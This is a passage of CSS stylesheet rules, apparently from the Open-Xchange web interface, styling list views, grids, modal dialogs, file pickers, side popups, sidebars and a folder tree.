            -webkit-animation: scaleDown 120ms;
        }

        @-webkit-keyframes scaleDown {
            from {
                -webkit-transform: scale(1);
            }

            to {
                -webkit-transform: scale(0);
            }
        }

        @keyframes scaleDown {
            from {
                transform: scale(1);
            }

            to {
                transform: scale(0);
            }
        }

        .smartphone .list-view .list-item .list-item-checkmark .fa-checkmark {
            top: 8px;
        }

        .smartphone .list-item .list-item-checkmark .fa-checkmark:before {
            content: "\f1db";
        }

        .smartphone .list-item.selected:not(.no-checkbox) .fa-checkmark:before {
            content: "\f058";
        }

        .leftside .list-view .list-item {
            outline: 0;
        }

        .megalist {
            position: absolute;
            z-index: 1000000;
            background-color: #fff;
            border: 24px solid rgba(0, 0, 0, 0.2);
            background-clip: padding-box;
            top: 0;
            left: 0;
            width: 320px;
            bottom: 0;
            margin: 0;
            padding: 0;
            outline: 0;
            overflow-y: auto;
        }

        .megalist>li {
            position: relative;
            height: 54px;
            padding: 8px 16px 8px 40px;
            border: 1px solid transparent;
            border-bottom: 1px solid rgba(0, 0, 0, 0.2);
            list-style-type: none;
            outline: 0;
        }

        .megalist>li[aria-selected="true"] {
            background-color: #ddd;
        }

        .megalist>li .fa:before {
            font: normal normal normal 14px/1 FontAwesome;
            -webkit-font-smoothing: antialiased;
            content: "\f096";
            color: #767676;
            position: absolute;
            left: 16px;
            top: 12px;
            font-size: 14px;
        }

        .megalist>li[aria-checked="true"] .fa:before {
            content: "\f14a";
        }

        .megalist.has-focus>li:focus {
            border-color: #f80;
        }

        .megalist.has-focus>li[aria-selected="true"] {
            color: white;
            background-color: #f80;
        }

        .megalist.has-focus>li[aria-selected="true"] .fa:before {
            color: white;
        }

        .megalist.has-focus>li[aria-selected="true"]:focus {
            border-color: transparent;
            background-color: #cc6d00;
        }

        .megalist .page-divider {
            display: none;
        }

        .vgrid {
            outline: 0;
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            right: -1px;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .vgrid .vgrid-scrollpane {
            overflow-x: hidden;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            -webkit-tap-highlight-color: transparent;
            z-index: 1;
        }

        .vgrid .vgrid-scrollpane.has-focus .vgrid-cell.selected {
            background-color: #e9f0fa;
        }

        .vgrid .vgrid-scrollpane.has-focus .vgrid-cell.selected * {
            color: #333;
        }

        .vgrid .vgrid-scrollpane.has-focus .vgrid-cell.selected i {
            color: #333;
        }

        .vgrid .vgrid-scrollpane.has-focus .vgrid-cell.selected:hover {
            background-color: #f1f6fc;
        }

        .vgrid .vgrid-scrollpane.has-focus .vgrid-cell.selected:focus {
            background-color: #e9f0fa;
        }

        .vgrid .resizebar {
            background: transparent;
            width: 5px;
            height: 100%;
            position: relative;
            z-index: 10000;
            float: right;
            cursor: e-resize;
            cursor: ew-resize;
            cursor: col-resize;
            right: -3px;
        }

        .vgrid .vgrid-toolbar {
            position: absolute;
            display: none;
            right: 0;
            left: 0;
            height: 40px;
            line-height: 39px;
            background-color: #fff;
            z-index: 2;
        }

        .vgrid .vgrid-toolbar a {
            text-decoration: none;
        }

        .vgrid .vgrid-toolbar a i {
            color: black;
            display: inline-block;
        }

        .vgrid .vgrid-toolbar.top {
            top: 0;
        }

        .vgrid .vgrid-toolbar.top .dropdown-menu {
            top: 110%;
            bottom: auto;
            right: 0;
            left: auto;
        }

        .vgrid .vgrid-toolbar.bottom {
            bottom: 0;
        }

        .vgrid .vgrid-toolbar.bottom .dropdown-menu {
            top: auto;
            bottom: 110%;
            right: 0;
            left: auto;
        }

        .vgrid .vgrid-toolbar .grid-info {
            flex: 1;
            text-align: center;
            line-height: 38px;
            margin-right: 16px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .vgrid .vgrid-toolbar .grid-info .folder-count {
            font-size: 13px;
            color: #767676;
        }

        .vgrid .vgrid-toolbar .grid-options.dropdown {
            position: absolute;
            right: 0;
            top: 0;
        }

        .vgrid .vgrid-toolbar .grid-options.dropdown a {
            display: block;
            padding-right: 16px;
            padding-left: 16px;
        }

        .vgrid .vgrid-toolbar .grid-options.dropdown a:focus,
        .vgrid .vgrid-toolbar .grid-options.dropdown a:focus i {
            color: #f0faff;
            background: #e9f0fa;
            outline: 0;
        }

        .vgrid .vgrid-toolbar .select-all {
            display: inline-block;
        }

        .vgrid .vgrid-toolbar .select-all i {
            color: #767676;
            font-size: 18px;
            position: relative;
            top: 2px;
            left: 3px;
            padding-right: 5px;
        }

        .vgrid .vgrid-toolbar .select-all i.fa-check-square-o {
            padding-right: 2px;
        }

        .vgrid .vgrid-toolbar .select-all:focus,
        .vgrid .vgrid-toolbar .select-all:focus i {
            color: #f0faff;
            background: #e9f0fa;
            outline: 0;
        }

        .vgrid .vgrid-toolbar .select-all-toggle {
            float: left;
            padding: 0 8px;
        }

        .vgrid.editable .select-all {
            display: inline-block;
        }

        .vgrid.top-toolbar .vgrid-toolbar.top,
        .vgrid.bottom-toolbar .vgrid-toolbar.bottom {
            display: flex;
        }

        .vgrid.top-toolbar .vgrid-scrollpane {
            top: 40px;
        }

        .vgrid.bottom-toolbar .vgrid-scrollpane {
            bottom: 40px;
        }

        .vgrid.editable .vgrid-cell-checkbox {
            display: block;
        }

        .vgrid.editable .vgrid-cell {
            padding-left: 48px;
        }

        .vgrid-cell {
            outline: 0;
            overflow: hidden;
            position: absolute;
            right: 0;
            left: 0;
            font-size: 13px;
            padding: 10px 18px 14px 18px;
            color: #333;
            background-color: #fff;
        }

        .vgrid-cell * {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            -webkit-font-smoothing: antialiased;
        }

        .vgrid-cell.selectable {
            cursor: pointer;
        }

        .vgrid-cell.vgrid-label {
            font-weight: bold;
            text-align: center;
            line-height: 1em;
            padding: 5px 16px 4px 16px;
            background-color: #f1f1f1;
            border-bottom: 1px solid #d6d6d6;
            cursor: pointer;
            background-color: #fafafa;
            background-image: -moz-linear-gradient(top, #fff, #f3f3f3);
            background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#fff), to(#f3f3f3));
            background-image: -webkit-linear-gradient(top, #fff, #f3f3f3);
            background-image: -o-linear-gradient(top, #fff, #f3f3f3);
            background-image: linear-gradient(to bottom, #fff, #f3f3f3);
            background-repeat: repeat-x;
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#fff3f3f3', GradientType=0);
        }

        .vgrid-cell.vgrid-label.left {
            text-align: left;
        }

        .vgrid-cell:hover {
            background: #f7f7f7;
        }

        .vgrid-cell.selected {
            background-color: #ddd;
        }

        .vgrid-cell.selected:hover {
            background-color: #e2e2e2;
        }

        .vgrid-cell.relative {
            position: relative;
        }

        .vgrid-cell.no-border {
            border-bottom: 0 none;
        }

        .vgrid-cell.tail {
            border-bottom: 0 none;
            padding-top: 1em;
            padding-bottom: 1em;
        }

        .vgrid-cell.tail * {
            white-space: normal;
            line-height: 1.1em;
        }

        .vgrid-cell .title {
            white-space: pre;
        }

        .vgrid-cell .vgrid-cell-checkbox {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 48px;
            display: none;
            cursor: pointer;
            padding: 12px 0 0 16px;
        }

        .vgrid-cell .vgrid-cell-checkbox i.fa:before {
            color: #626262;
            font-size: 18px;
            content: "\f096";
        }

        .vgrid-cell.selected .vgrid-cell-checkbox i.fa:before {
            color: #626262;
            content: "\f14a";
        }

        .has-focus .vgrid-cell.selected .vgrid-cell-checkbox i.fa:before {
            color: #fff;
        }

        .vgrid-cell .swipeDelete {
            position: absolute;
            top: 0;
            right: 0;
            padding: 0 10px 0 10px;
            line-height: 61px;
            height: 100%;
            background-color: #ff4105;
            color: #fff;
            font-size: 22px;
            width: 80px;
            text-align: center;
        }

        .vgrid-cell .swipeDelete:active {
            background-color: #c72f29;
        }

        .io-ox-sidepopup .vgrid-cell:not(.calendar-grid-cell) {
            padding-left: 0 !important;
            padding-right: 0 !important;
        }

        .io-ox-dialog-wrapper {
            height: 100%;
            width: 100%;
        }

        .io-ox-dialog-wrapper .modal-title {
            font-size: 18px;
            line-height: 24px;
            margin: -3px 0 2px 0;
        }

        .io-ox-dialog-wrapper .modal-body {
            overflow-y: auto;
            max-height: 400px;
            padding: 15px;
        }

        .io-ox-dialog-wrapper .modal-footer .checkbox {
            float: left;
            margin-top: 6px;
            margin-bottom: 0;
        }

        .io-ox-dialog-wrapper .modal-footer .checkbox.checkbox-block {
            float: none;
            text-align: left;
            margin-top: 5px;
            margin-bottom: 10px;
            margin: 0 0 8px 0;
        }

        .io-ox-dialog-underlay {
            background-color: black;
            opacity: 0;
            z-index: 65000;
            -webkit-transition: opacity 0.15s linear;
            -o-transition: opacity 0.15s linear;
            transition: opacity 0.15s linear;
        }

        .io-ox-dialog-underlay.in {
            opacity: 0.3;
        }

        .io-ox-dialog-underlay.topmost {
            z-index: 65002;
        }

        .io-ox-dialog-popup {
            position: relative;
            max-width: 500px;
            margin: 0 auto 0 auto;
            overflow: visible;
            background-color: white;
            z-index: 65001;
            border: 0 none;
            box-shadow: 0 5px 25px -5px #000;
            border-radius: 3px;
        }

        .io-ox-dialog-popup .modal-header {
            position: relative;
        }

        .io-ox-dialog-popup .modal-header h1,
        .io-ox-dialog-popup .modal-header h2,
        .io-ox-dialog-popup .modal-header h3,
        .io-ox-dialog-popup .modal-header h4 {
            font-size: 18px;
            line-height: 24px;
            margin: 0;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .io-ox-dialog-popup .modal-header.help h1,
        .io-ox-dialog-popup .modal-header.help h2,
        .io-ox-dialog-popup .modal-header.help h3,
        .io-ox-dialog-popup .modal-header.help h4 {
            margin-right: 35px;
        }

        .io-ox-dialog-popup .modal-header .io-ox-context-help {
            padding: 13px;
            position: absolute;
            top: 0;
            right: 0;
            font-size: 20px;
            line-height: 1.1;
        }

        .io-ox-dialog-popup .modal-body.max-height-100 {
            max-height: 100px;
        }

        .io-ox-dialog-popup .modal-body.max-height-150 {
            max-height: 150px;
        }

        .io-ox-dialog-popup .modal-body.max-height-200 {
            max-height: 200px;
        }

        .io-ox-dialog-popup .modal-body.max-height-250 {
            max-height: 250px;
        }

        .io-ox-dialog-popup .modal-body.max-height-300 {
            max-height: 300px;
        }

        .io-ox-dialog-popup .modal-body.max-height-350 {
            max-height: 350px;
        }

        .io-ox-dialog-popup .modal-body h1 {
            font-size: 18px;
            margin-top: 10px;
            margin-bottom: 10px;
        }

        .io-ox-dialog-popup.zero-padding .modal-body {
            padding: 0;
        }

        .io-ox-dialog-popup.zero-padding .modal-body iframe {
            display: block;
            border-radius: 5px 5px 0 0;
        }

        .io-ox-dialog-popup.zero-padding .modal-footer {
            margin-top: 0;
        }

        .io-ox-dialog-popup.relogin {
            z-index: 65301;
        }

        .io-ox-dialog-popup .content {
            overflow: auto;
        }

        .io-ox-dialog-popup .content .plain-text {
            font-size: 12pt;
            text-align: center;
            color: #333;
            padding: 10px;
        }

        .io-ox-dialog-popup .modal-footer>.btn {
            min-width: 5em;
        }

        .io-ox-dialog-popup .modal-footer .help-block {
            text-align: left;
        }

        .io-ox-dialog-popup .modal-footer .help-block:empty {
            display: none;
        }

        .io-ox-dialog-popup .io-ox-sidepopup.right {
            border-radius: 0 5px 5px 0;
        }

        .io-ox-dialog-popup .io-ox-sidepopup.left {
            border-radius: 5px 0 0 5px;
        }

        .io-ox-dialog-popup:focus {
            outline: 0;
            box-shadow: 0 5px 25px -5px #003655;
        }

        .io-ox-dialog-popup.topmost {
            z-index: 65003;
        }

        .io-ox-dialog-popup .modal-header,
        .io-ox-dialog-popup .modal-footer {
            padding: 12px 16px;
        }

        .subscribe-imap-folder .modal-body {
            padding: 0;
        }

        .ios.smartphone>div,
        .android.smartphone .picker-pc-container .modal-body>div,
        .ios.smartphone>ul,
        .android.smartphone .picker-pc-container .modal-body>ul {
            width: 100%;
        }

        .picker-pc-container .io-ox-pagecontroller.page {
            padding-top: 40px;
        }

        .add-infostore-file .picker-pc-container {
            position: relative;
            height: 350px;
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file {
            font-size: 16px;
            outline: 0;
            line-height: 40px;
            padding: 2px 7px;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file label {
            margin-top: 10px;
            margin-left: 2px;
            margin-right: 5px;
            float: left;
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file .checkbox-inline {
            font-size: 16px;
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file .name {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file.selected,
        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file.selected:hover {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file.selected *,
        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file.selected:hover * {
            color: #333;
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file:focus {
            background-color: #e9f0fa;
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection li.file:focus * {
            color: #fff;
        }

        .add-infostore-file .picker-pc-container .io-ox-fileselection.singleselect li.file .name {
            padding-left: 0.5em;
        }

        .add-infostore-file .modal-body {
            padding: 0;
            overflow: hidden;
        }

        .add-infostore-file .modal-body>div,
        .add-infostore-file .modal-body>ul {
            display: inline-block;
            overflow: auto;
            width: 33%;
            height: 100%;
            margin: 0;
            vertical-align: top;
        }

        .add-infostore-file .modal-body> :first-child:nth-last-child(3),
        .add-infostore-file .modal-body> :nth-child(2):nth-last-child(2),
        .add-infostore-file .modal-body> :nth-child(3):last-child {
            width: 33%;
        }

        .add-infostore-file .modal-body>.preview-pane {
            padding: 10px 3px 10px 10px;
            border-left: 1px solid #ddd;
            text-align: center;
        }

        .add-infostore-file .modal-body>.preview-pane>.preview {
            position: relative;
            display: block;
            width: 100%;
            height: 140px;
            margin: 0 0 10px 0;
            background-size: contain;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: scroll;
        }

        .add-infostore-file .modal-body>.preview-pane>.preview .file-type-icon {
            position: relative;
            top: 45px;
            width: 100px;
            font-size: 70px;
            font-weight: 100;
        }

        .add-infostore-file .modal-body>.preview-pane>.fileinfo dl {
            margin: 0;
        }

        .add-infostore-file .modal-body>.preview-pane>.fileinfo dt {
            margin: 2px 0 -2px 0;
        }

        .add-infostore-file .modal-body>.preview-pane>.fileinfo dd.file-name {
            word-wrap: break-word;
            word-break: break-all;
        }

        .add-infostore-file .modal-body>.preview-pane>.fileinfo dd.modified>span {
            display: block;
        }

        .add-infostore-file .modal-body .folder-tree {
            border-right: 1px solid #ddd;
        }

        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected {
            background-color: #e9f0fa;
        }

        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected * {
            color: #fff;
        }

        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.marked:not(.selected) {
            box-shadow: inset 0px 0px 0px 2px #86acd2;
        }

        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected:not(.marked):focus {
            background-color: #d4e2f5;
        }

        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected:not(.marked):focus * {
            color: #fff;
        }

        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected.marked:focus {
            background-color: #d4e2f5;
            box-shadow: inset 0px 0px 0px 2px #86acd2;
        }

        .add-infostore-file .modal-body .io-ox-fileselection.has-focus>li.file.selected.marked:focus * {
            color: #fff;
        }

        .add-infostore-file .modal-body .io-ox-fileselection li.file {
            outline: 0;
            line-height: 30px;
            padding: 2px 7px;
            cursor: pointer;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .add-infostore-file .modal-body .io-ox-fileselection li.file label {
            margin-top: 5px;
            margin-left: 5px;
            float: left;
        }

        .add-infostore-file .modal-body .io-ox-fileselection li.file .name {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            padding-left: 0.5em;
        }

        .add-infostore-file .modal-body .io-ox-fileselection li.file.selected {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .add-infostore-file .modal-body .io-ox-fileselection li.file.selected * {
            color: #333;
        }

        .add-infostore-file .modal-body .io-ox-fileselection li.file .checkbox-inline {
            display: none;
        }

        .touch .add-infostore-file .modal-body .io-ox-fileselection.multiselect li.file .checkbox-inline {
            display: block;
            height: 20px;
            background: transparent;
            margin-top: 2px;
        }

        .touch .add-infostore-file .modal-body .io-ox-fileselection.multiselect li.file .checkbox-inline input[type="checkbox"] {
            height: 20px;
            cursor: pointer;
        }

        .touch .add-infostore-file .modal-body .io-ox-fileselection.multiselect li.file .name {
            padding-left: 0;
        }

        .add-infostore-file .modal-footer {
            margin-top: 0;
        }

        .smartphone .add-infostore-file .picker-pc-container .folder-tree .folder-node .folder-arrow {
            position: static;
        }

        .smartphone .add-infostore-file .modal-body>div,
        .smartphone .add-infostore-file .modal-body>ul {
            width: 100%;
        }

        .ios .io-ox-dialog-popup {
            -webkit-overflow-scrolling: touch;
        }

        .mobile-dialog.io-ox-dialog-popup {
            overflow-y: scroll;
            max-height: 95%;
            width: 95%;
            margin-top: 0;
            top: 10px;
            border-radius: 0;
        }

        .mobile-dialog.io-ox-dialog-popup .modal-footer {
            margin-top: 0;
        }

        .mobile-dialog.io-ox-dialog-popup .modal-footer .row [class*="col-"] {
            margin-left: 0;
        }

        .mobile-dialog.io-ox-dialog-popup .modal-footer .row .btn {
            width: 100%;
            margin: 2px 0;
        }

        .mobile-dialog.io-ox-dialog-popup h3 {
            font-size: 20px;
        }

        .legacy-chrome .io-ox-dialog-popup .modal-footer .row {
            margin: 0;
        }

        .legacy-chrome .io-ox-dialog-popup .modal-footer .row .col-md-3 {
            padding: 0;
        }

        .export-dialog .modal-body label.checkbox {
            padding-left: 20px;
        }

        .export-dialog select {
            width: 100%;
        }

        .modal.flex {
            display: block;
            overflow: hidden;
        }

        .modal.flex.compact .modal-dialog .modal-header {
            border-bottom: 0;
        }

        .modal.flex.compact .modal-dialog .modal-body {
            min-height: 0;
            padding: 0;
        }

        .modal.flex .modal-dialog {
            margin: 0 auto;
            width: 500px;
            height: 100%;
            display: flex;
            align-items: center;
        }

        .modal.flex .modal-content {
            border: 0;
            display: flex;
            flex-direction: column;
            width: 100%;
            max-height: calc(100vh - 48px);
            overflow: auto;
        }

        .modal.flex .modal-title {
            font-size: 18px;
            line-height: 24px;
            margin: -3px 0 2px 0;
        }

        .modal.flex .modal-subtitle {
            line-height: 16px;
            padding-top: 4px;
            margin-bottom: 4px;
        }

        .modal.flex.zero-padding .modal-body {
            padding: 0;
        }

        .modal.flex .modal-header,
        .modal.flex .modal-body,
        .modal.flex .modal-footer {
            padding: 16px;
            flex-grow: 0;
        }

        .modal.flex .modal-body {
            min-height: 60px;
            overflow-y: auto;
            flex-grow: 1;
        }

        .modal.flex .modal-body h2 {
            font-size: 18px;
        }

        .modal.flex .modal-footer .btn.pull-left {
            margin-right: 8px;
        }

        .modal.flex .modal-footer .btn.pull-right {
            margin-left: 8px;
        }

        .modal.flex .modal-footer .checkbox.custom {
            margin-bottom: 0;
            margin-top: 3px;
        }

        .modal.flex .modal-footer .help-block {
            text-align: left;
        }

        .modal.flex.mobile-dialog .modal-dialog {
            width: 96%;
        }

        .modal.flex.mobile-dialog .modal-footer .row [class*="col-"] {
            margin-left: 0;
        }

        .modal.flex.mobile-dialog .modal-footer .row .btn {
            width: 100%;
            margin: 2px 0;
        }

        .modal.flex.maximize .modal-dialog {
            height: 100%;
        }

        .modal.flex.maximize .modal-content {
            display: flex;
            flex-direction: column;
            align-items: stretch;
            height: 100%;
        }

        .modal.flex.maximize .modal-body {
            flex-grow: 1;
        }

        .modal.flex .modal-header.help .modal-title {
            margin-right: 40px;
        }

        .modal.flex .modal-header.help .io-ox-context-help {
            margin: 16px 16px 0 16px;
            position: absolute;
            top: 0;
            right: 0;
            font-size: 18px;
            line-height: 24px;
        }

        .modal.flex .modal-body.av-dialog>div {
            padding-left: 24px;
        }

        .modal.flex .modal-body.av-dialog i {
            float: left;
            padding-top: 3px;
            color: #676767;
        }

        .modal.flex .modal-body.av-dialog.av-danger>div {
            padding-left: 40px;
        }

        .modal.flex .modal-body.av-dialog.av-danger i {
            padding-top: 5px;
            color: #c00;
            font-size: 30px;
        }

        .floating-body .io-ox-sidepopup.first {
            max-width: none;
        }

        .io-ox-sidepopup {
            background-color: white;
            z-index: 3;
            top: 50px;
            right: 50px;
            bottom: 50px;
            left: 50px;
        }

        .io-ox-sidepopup.right {
            left: 49.5%;
            box-shadow: 20px 0 100px 0 rgba(0, 0, 0, 0.5);
        }

        .io-ox-sidepopup.left {
            right: 49.5%;
            box-shadow: -20px 0 100px 0 rgba(0, 0, 0, 0.5);
        }

        .io-ox-sidepopup.first {
            left: auto;
            right: auto;
            width: 600px;
            max-width: 45%;
        }

        .notifications-overlay .io-ox-sidepopup {
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
        }

        @media (max-width: 900px) {

            .io-ox-sidepopup.right,
            .io-ox-sidepopup.left {
                left: 8px;
                right: 8px;
            }
        }

        @media (max-width: 540px),
        (max-device-width: 540px) {
            .io-ox-sidepopup {
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
            }

            .io-ox-sidepopup.first {
                max-width: 100%;
            }

            .io-ox-sidepopup.right,
            .io-ox-sidepopup.left {
                left: 0;
                right: 0;
                border-left: 0 none;
                border-right: 0 none;
            }
        }

        @media (min-width: 540px),
        (min-device-width: 540px) {
            .notifications-overlay .io-ox-sidepopup.right {
                left: 39.5%;
            }

            .notifications-overlay .io-ox-sidepopup.left {
                right: 39.5%;
            }
        }

        .io-ox-sidepopup-arrow {
            position: absolute;
            z-index: 4;
        }

        .io-ox-sidepopup-arrow .border,
        .io-ox-sidepopup-arrow .triangle {
            position: absolute;
            height: 0;
            width: 0;
            border: 20px solid transparent;
            top: -20px;
        }

        .io-ox-sidepopup-arrow.left {
            left: 0;
            right: 49.5%;
        }

        .io-ox-sidepopup-arrow.left .border {
            border-left-color: #eee;
            right: -40px;
        }

        .io-ox-sidepopup-arrow.left .triangle {
            border-left-color: #fff;
            right: -39px;
        }

        .io-ox-sidepopup-arrow.right {
            left: 49.5%;
            right: 0;
        }

        .io-ox-sidepopup-arrow.right .border {
            border-right-color: #eee;
            left: -40px;
        }

        .io-ox-sidepopup-arrow.right .triangle {
            border-right-color: #fff;
            left: -39px;
        }

        .notifications-overlay .io-ox-sidepopup-arrow.right {
            left: 39.5%;
        }

        .notifications-overlay .io-ox-sidepopup-arrow.left {
            right: 39.5%;
        }

        .content-v-shift .io-ox-sidepopup {
            padding-top: 40px;
        }

        .io-ox-sidepopup-overlay {
            z-index: 3;
            background-color: rgba(0, 0, 0, 0.5);
        }

        .io-ox-sidepopup-pane {
            top: 45px;
            padding-top: 0;
            outline: 0;
        }

        .io-ox-sidepopup-close {
            padding: 10px 15px;
            text-align: right;
            margin: 10px 10px 0;
        }

        .io-ox-sidepopup-close .btn {
            margin-left: 13px;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .io-ox-sidepopup-close .btn-sidepopup {
            display: inline-block;
            background-color: #eee;
            color: #676767;
            padding: 6px 13px;
            margin-left: 7px;
            border-radius: 0 0 3px 3px;
            cursor: pointer;
        }

        .io-ox-sidepopup-close .btn-sidepopup:hover,
        .io-ox-sidepopup-close .btn-sidepopup:focus {
            background-color: #676767;
            color: #eee;
            text-decoration: none;
        }

        @media (max-width: 900px) {
            .io-ox-sidepopup-arrow {
                display: none;
            }

            .io-ox-sidepopup-pane {
                top: 35px;
            }

            .io-ox-sidepopup-pane .default-content-padding {
                padding: 0 13px 13px 13px;
            }

            .io-ox-sidepopup-close {
                margin: 0 13px;
            }

            .simple-window .io-ox-sidepopup {
                position: static;
                min-height: 200px;
            }

            .simple-window .io-ox-sidepopup-pane {
                position: static;
            }

            .simple-window .io-ox-sidepopup-pane .io-ox-busy {
                min-height: 20px;
            }

            .simple-window .io-ox-sidepopup-pane .default-content-padding {
                padding-top: 7px;
            }
        }

        @media all and (max-width: 540px),
        all and (max-device-width: 540px) {
            .io-ox-sidepopup-close {
                margin: 0;
            }

            .io-ox-sidepopup-close .close {
                float: none;
            }
        }

        .generic-sidebar-container.visible.has-left>.generic-sidebar-content {
            left: 320px;
        }

        .generic-sidebar-container.visible.has-right>.generic-sidebar-content {
            right: 320px;
        }

        .generic-sidebar-container.visible.has-left>.generic-sidebar {
            left: 0;
            right: auto;
        }

        .generic-sidebar-container.visible.has-right>.generic-sidebar {
            right: 0;
            left: auto;
        }

        .generic-sidebar-container .generic-sidebar-content {
            z-index: 1;
        }

        .generic-sidebar-container .generic-sidebar {
            display: none;
            background-color: #f5f5f5;
            z-index: 0;
        }

        .generic-sidebar-container.visible>.generic-sidebar {
            display: block;
            width: 320px;
        }

        .generic-sidebar-container.visible.maximize>.generic-sidebar {
            left: 0;
            right: 0;
            width: auto;
            z-index: 2;
            border: 0;
        }

        .primary-action {
            padding: 16px 16px 15px 16px;
            border-bottom: 1px solid #ddd;
        }

        .primary-action .btn.btn-primary {
            width: 100%;
            border: 0;
            border-radius: 0;
            line-height: 40px;
            padding: 0 8px;
            background-color: #f80;
            transition: background-color 5s linear;
        }

        html.design-night .primary-action .btn.btn-primary {
            background-color: #f80;
        }

        html.design-twilight .primary-action .btn.btn-primary {
            background-color: #4d7155;
        }

        html.design-dawn .primary-action .btn.btn-primary {
            background-color: #2c6e7f;
        }

        html.design-day .primary-action .btn.btn-primary {
            background-color: #f80;
        }

        html.design-dusk .primary-action .btn.btn-primary {
            background-color: #753e93;
        }

        html.design-late .primary-action .btn.btn-primary {
            background-color: #f80;
        }

        @media all and (max-width: 540px) {
            .generic-sidebar-container .generic-sidebar {
                display: none;
            }
        }

        @media all and (min-width: 1281px) {
            .generic-sidebar-container.visible.has-left>.generic-sidebar-content {
                left: 320px;
            }

            .generic-sidebar-container.visible.has-right>.generic-sidebar-content {
                right: 320px;
            }

            .generic-sidebar-container.visible>.generic-sidebar {
                width: 320px;
            }
        }

        .folder-tree {
            padding: 8px 0;
            overflow: auto;
            background-color: #f8f8f8;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .folder-tree .tree-container {
            min-width: 100%;
            display: block;
            padding: 0;
            margin: 0;
            outline: 0;
        }

        .folder-tree a[role="treeitem"] {
            text-decoration: underline;
        }

        .folder-tree .folder {
            line-height: 23px;
            overflow: visible;
            white-space: nowrap;
            width: 100%;
            display: block;
            cursor: pointer;
            outline: 0;
        }

        .folder-tree .folder.selected>.folder-node .folder-options {
            display: inline-block;
        }

        .folder-tree .folder.empty {
            display: none;
        }

        .folder-tree .folder.empty.show-anyway {
            display: block;
        }

        .folder-tree .folder.empty.show-anyway .folder-arrow .fa:before {
            display: none;
        }

        .folder-tree .folder.disabled>.folder-node>.folder-label,
        .folder-tree .folder.no-select>.folder-node>.folder-label {
            color: #707070;
            font-style: italic;
        }

        .folder-tree .folder.selected.no-select:not(:focus)>.folder-node>.folder-label {
            color: #616161;
        }

        .folder-tree.visible-selection .selected>.folder-node {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .folder-tree.visible-selection .selected>.folder-node * {
            color: #333;
        }

        .folder-tree.visible-selection .selectable>.folder-node:hover,
        .folder-tree.visible-selection .selectable.dnd-over>.folder-node {
            background-color: rgba(0, 0, 0, 0.05);
        }

        .folder-tree.visible-selection .selectable:focus>.folder-node {
            background-color: #e9f0fa;
        }

        .folder-tree.visible-selection .selectable:focus>.folder-node * {
            color: #fff;
        }

        .folder-tree.visible-selection .selectable:focus>.folder-node .folder-counter {
            color: rgba(255, 255, 255, 0.95);
        }

        .folder-tree.visible-selection .selectable:focus>.folder-node .folder-options {
            background-color: rgba(0, 0, 0, 0.2);
        }

        .folder-tree.visible-selection-smartphone .selected>.folder-node {
            background-color: #e9f0fa;
        }

        .folder-tree.visible-selection-smartphone .selected>.folder-node * {
            color: #fff;
        }

        .folder-tree.visible-selection-smartphone .selected>.folder-node .folder-counter {
            color: rgba(255, 255, 255, 0.95);
        }

        .folder-tree.visible-selection-smartphone .selected>.folder-node .folder-options {
            background-color: rgba(0, 0, 0, 0.2);
        }

        .folder-tree .folder-node {
            height: 24px;
        }

        .folder-tree .folder-node a.account-link {
            padding: 0 8px;
            color: #333;
            vertical-align: top;
        }

        .folder-tree .folder-node .folder-arrow {
            color: #777;
            display: inline-block;
            padding-left: 16px;
            width: 40px;
        }

        .folder-tree .folder-node .folder-label,
        .folder-tree .folder-node .folder-counter,
        .folder-tree .folder-node .folder-options,
        .folder-tree .folder-node .folder-buttons,
        .folder-tree .folder-node .account-link {
            font-weight: 400;
            display: inline-block;
            -webkit-font-smoothing: antialiased;
            margin: 0 16px 0 0;
            vertical-align: top;
        }

        .folder-tree .folder-node .folder-label:empty,
        .folder-tree .folder-node .folder-counter:empty,
        .folder-tree .folder-node .folder-options:empty,
        .folder-tree .folder-node .folder-buttons:empty,
        .folder-tree .folder-node .account-link:empty {
            margin: 0;
        }

        .folder-tree .folder-node .folder-options {
            margin-right: 0;
        }

        .folder-tree .folder-node .folder-label {
            font-size: 13px;
        }

        .folder-tree .folder-node .folder-label:first-child {
            margin-left: 16px;
        }

        .folder-tree .folder-node .folder-counter {
            color: #07b;
            font-weight: 700;
            display: none;
